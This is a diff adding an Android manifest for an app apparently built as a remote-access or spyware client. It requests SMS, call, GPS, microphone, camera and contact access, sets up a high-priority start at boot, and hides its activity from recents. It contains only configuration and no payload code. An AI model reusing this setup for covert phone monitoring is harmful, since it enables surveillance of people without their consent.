@@ -1,0 +1,112 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="my.app.client"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <uses-sdk android:minSdkVersion="8" />
+	<!-- 增加文件存储和访问摄像头的权限 -->  
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <!-- Pour déclencher le service lors de la reception d'un SMS -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <!-- Pour déclencher le service lorsque le SMS reçu contient un mot clé -->
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <!-- Pour permettre l'envoi d'un SMS -->
+
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <!-- Pour récupérer l'IMEI et toutes ses informations -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <!-- Pour récupérer les appels sortant -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <!-- Pour savoir s'il l'on est connecté ou pas -->
+
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <!-- Acceder aux coordonnées GPS -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <!-- Pour utiliser les sockets -->
+
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <!-- Pour enregistrer de l'audio -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <!-- Pour plus tard avec SD card -->
+
+    <uses-permission android:name="android.permission.CAMERA" />
+    <!-- Pour prendre des photos avec la camera -->
+    <uses-feature android:name="android.hardware.camera"/>
+    <uses-feature android:name="android.hardware.camera.autofocus" />
+	<uses-feature android:name="android.hardware.camera.flash" />
+
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <!-- To start just after Boot -->
+
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <!-- Pour permettre de lancer un appel -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+
+    <application
+        android:name="my.app.client.MyApplication"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name" >
+        <receiver
+            android:name="my.app.client.BootReceiver"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
+            <intent-filter android:priority="999" >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <category android:name="android.intent.category.HOME" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.MEDIA_MOUNTED" />
+                <action android:name="android.intent.action.MEDIA_UNMOUNTED" />
+
+                <data android:scheme="file" >
+                </data>
+            </intent-filter>
+        </receiver>
+        
+        <service android:name="my.app.client.Client"
+            android:enabled="true"
+            android:process=":Client" >
+            <intent-filter>
+                <action android:name=".Client" />
+            </intent-filter>
+        </service>
+
+        <receiver android:name="my.app.client.AlarmListener" >
+        </receiver>
+
+        <activity
+            android:name="my.app.client.LauncherActivity"
+            android:excludeFromRecents="true"
+            android:label="@string/app_name" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <!-- <data
+                    android:host="AuthActivity"
+                    android:scheme="my.app.client" /> -->
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity android:name="org.yanzi.activity.CameraActivity"/>
+
+        <service
+            android:name="my.app.client.service.StartService"
+            android:enabled="true"
+            android:process=":StartService" >
+        </service>
+        
+        <!-- jobserver -->
+        <service
+            android:name="service.MyJobService"
+            android:enabled="true"
+            android:exported="true"
+            android:process=":MyJobService"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+    </application>
+
+</manifest>
